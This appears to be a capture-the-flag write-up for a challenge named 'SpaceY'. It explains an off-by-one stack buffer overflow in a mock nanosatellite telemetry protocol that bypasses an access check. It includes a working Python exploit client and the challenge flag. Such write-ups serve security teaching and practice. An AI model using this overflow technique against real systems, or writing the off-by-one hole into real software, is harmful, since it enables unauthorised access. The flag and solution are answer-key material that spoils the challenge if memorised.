# Solution Write Up for 'SpaceY'
# Expected Behavior
The challenger is given a space protocol specification for communicating with a Nanosatellite. In addition they are given the binary which executes the protocol on the Nanosatellite and a python client script which implements the protocol.They must get access to the control service functionality by finding a vulnerability in the protocol.  

## Vulnerability Description
1. Stack buffer fixed size of MAX_FILE_SIZE 3072 (12 x 256 bytes)
2. Telemetry service packet handler reassembles fragments into file of MAX_FILE_SIZE but is off by one counting from 0 and 12 inclusive so allows 13 packets instead of twelve thus overflowing fixed stack buffer
3. The telemetry service only allows fragments 0->11, but does not track state of fragments received so can resend a fragment ID thus getting 13 packets into stack buffer which results in ability to overflow stack buffer by 256 bytes

## Supporting solution info
Steps to recreate
1. The service output strings on console give pivot points
2. Map these strings to switch statement in binary which is service handler
3. In telemetry service handler “File receive string - ...” shows that it compares for 13 packets not twelve so you can resend a fragment ID between 0-12 as part of telemetry service
4. In control service handler you can see that it strcmp for a password in access.txt and then sets flag at a pointer – this pointer is located on stack
5. The accesscheck pointer on stack is just above the telemetry buffer so by sending 13 packets and overwriting the accesscheck value on stack with 1 it bypasses the accesscheck logic
6. Then instead of sending a disconnect service packet per the spec, send a control packet and you get access to the flag

# Solution
Client Python Solution
```python
#!/usr/bin/env python2

import socket
import sys
import os
import struct
from ctypes import *
import threading
import select
import time

''''Procotol Services'''
bus_service = "\x01"
payload_service = "\x02"
telemetry_service = "\x03"
control_service = "\x04"
disconnect_service = "\x05"

'''Protocol fields'''
length = "\x12"
fragment_id = "\x00"
data = "\x00"*256
maldata = "\x01"*256

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def connect(sock):
    server_address = ("192.168.7.17", 3210)
    sock.connect(server_address)

def transceive_packet(sock, service, length, fragment_id, data):
    count = 0
    if service==telemetry_service:
        while count < 12:
            fragment_id = struct.pack('>B',count)
            packet = service + length + fragment_id + data
            sock.send(packet)
            count = count+1
            time.sleep(0.2)#must keep this delay between packets for tranmission sync with satellite
    else:
        packet = service + length + fragment_id + data
        sock.send(packet)
        while count <=4:
            data = sock.recv(74)
            print data
            count = count+1
            time.sleep(0.2)#must keep this delay between packets for tranmission sync with satellite

connect(sock)
transceive_packet(sock, telemetry_service, length, fragment_id, data)
transceive_packet(sock, telemetry_service, length, fragment_id, maldata)
transceive_packet(sock, control_service, length, fragment_id, data)
```




# Flag
ATR[GroundControlNowCanAccessMajorTom]
